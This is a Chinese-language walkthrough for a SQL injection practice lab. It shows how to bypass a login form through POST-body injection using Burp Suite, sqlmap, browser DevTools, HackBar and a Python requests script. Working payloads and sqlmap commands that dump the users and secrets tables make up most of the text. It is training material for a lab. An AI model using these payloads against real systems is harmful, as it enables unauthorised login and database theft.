先分清：本关的注入点在 POST 请求体里

注入点是登录表单的 username / password 两个字段，提交到 modules/sqli/post.php，Content-Type 为 application/x-www-form-urlencoded。服务端把它直接拼进 WHERE username = '$u' AND password = '$p'，页面会回显执行过的 SQL，方便对照。

  • 参数位置不同：GET 注入的 payload 在 URL 查询串（?id=1），本关在请求体（body）里，地址栏、访问日志、Referer 都看不到 payload。
  • 必须保证 Content-Type 正确：表单默认 application/x-www-form-urlencoded；如果接口改成 JSON，就要把 Content-Type 改为 application/json 并按 JSON 格式改 body，否则服务端读不到参数。
  • 工具入口不同：GET 用 sqlmap -u "http://.../x.php?id=1"；POST 要用 --data 指定 body，或 -r 直接读 Burp 保存的请求文件。

Burp Suite（抓包改包，最直观）

解决什么问题：POST 参数在 body 里，浏览器地址栏改不到，必须拦下请求在 body 中改值；同时可以反复 Repeater 调试闭合符、注释符。

1. 浏览器代理设为 127.0.0.1:8080，打开 {{SITE}}/modules/sqli/post.php
2. 用户名填 admin' or '1'='1' # ，密码随便填，点「登录」
3. Proxy → HTTP history 找到 POST /bafanglab/modules/sqli/post.php
4. 右键 → Send to Repeater，在 Params 面板或 Raw 里直接改 username 的值，点 Send
5. 对照响应：登录成功 / MySQL 错误 / 页面回显的「执行 SQL」
  • Repeater：手动改 body 逐条试闭合方式（'、"、)）与注释符（#、-- 、/**/）。
  • Intruder：把 username 的值设成 payload 位置，加载字典批量跑，按响应长度/关键字差异找布尔或时间盲注。
  • 保存请求文件：Repeater 里右键 → Save item / Copy to file，存成 burp_post.txt；也可用 BApp Store 的 Reporter 插件导出原始请求，供 sqlmap 的 -r 使用。

sqlmap（自动化拖库）

解决什么问题：自动识别 POST 参数、判断注入类型、枚举库表并导出数据，省去手工构造几十条 payload。

# 1. 直接指定 POST 参数（-p 锁定注入点，避免把 password 也当注入点）
sqlmap -u "{{SITE}}/modules/sqli/post.php" --data "username=admin&password=x" -p username --dbs --batch

# 2. 读 Burp 保存的请求文件（推荐，method/Content-Type/Cookie 全部原样带上）
sqlmap -r burp_post.txt --level=3 --risk=2 --batch

# 3. 导出 users / secrets 表（进阶目标：拿 secrets 通关凭证）
sqlmap -r burp_post.txt -D bafanglab -T users --dump --batch
sqlmap -r burp_post.txt -D bafanglab -T secrets --dump --batch

# 4. 只跑指定注入技术，减少无效探测
# --technique=B 布尔盲注  E 报错注入  U 联合查询  T 时间盲注
sqlmap -r burp_post.txt --technique=UBE --batch

# 5. --level/--risk 提高检测面
# --level=3 测试更多参数位置与边界；--risk=2 加入更有侵略性的 payload

与 GET 的差别：GET 只需把 payload 拼在 -u 的 URL 里；POST 必须用 --data 或 -r 把整个 body 交给 sqlmap，否则它只会把参数当成普通表单、检测不到注入。

本靶场实测：本关为字符型 POST 注入，-r 方式可自动识别并导出 bafanglab 库中的 secrets / users 表。

浏览器 DevTools（零工具快速验证）

  • Network → Edit and Resend：选中 post.php 请求，右键复制为 cURL 或使用编辑重发，直接改 body 的 username= 值。
  • Elements：直接改 input[name=username] 的 value，或删掉前端 maxlength/校验逻辑，再点登录。
  • Console + fetch：绕开页面表单逻辑直接发 POST，适合写进脚本反复调试（见下方代码）。
  • 改 Content-Type：若目标接口只收 JSON，在编辑重发里把 Content-Type 改为 application/json 并把 body 换成 JSON；类型不对时服务端取不到参数，注入自然无法成立。
fetch('{{SITE}}/modules/sqli/post.php', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'username=' + encodeURIComponent("admin' or '1'='1' #") + '&password=x'
}).then(r => r.text()).then(t => console.log(t));

HackBar（浏览器插件，快速改 POST body）

解决什么问题：不想开代理、只想临时改一次表单值时，用 HackBar 勾选 POST，填 URL 与 body 后直接 Execute。

URL:  {{SITE}}/modules/sqli/post.php
POST body: username=admin' or '1'='1' # &password=x

与 GET 的差别：GET 模式只需在 URL 后加 ?id=1；POST 模式必须把参数写进 body 输入框，并选择 POST 方法。

Python requests（批量脚本，便于判断盲注）

解决什么问题：把 payload 参数化，批量跑字典、比较响应长度，适合写布尔盲注/时间盲注的自动化验证。

import requests

url = "{{SITE}}/modules/sqli/post.php"
payload = {"username": "admin' or '1'='1' #", "password": "x"}

# data=字典会自动编码为 x-www-form-urlencoded，并带上正确的 Content-Type
r = requests.post(url, data=payload, timeout=10)
print(r.status_code, len(r.text))
print('登录成功' if '登录成功' in r.text else '未成功')
  • 与 GET 的差别：GET 用 requests.get(url, params=...)，参数进 URL；POST 用 requests.post(url, data=...)，参数进 body。
  • 接口要 JSON 时改用 json=payload，requests 会自动设置 application/json。
  • 盲注判断：固定其他字段，只替换 username，比较 len(r.text) 或耗时差异。
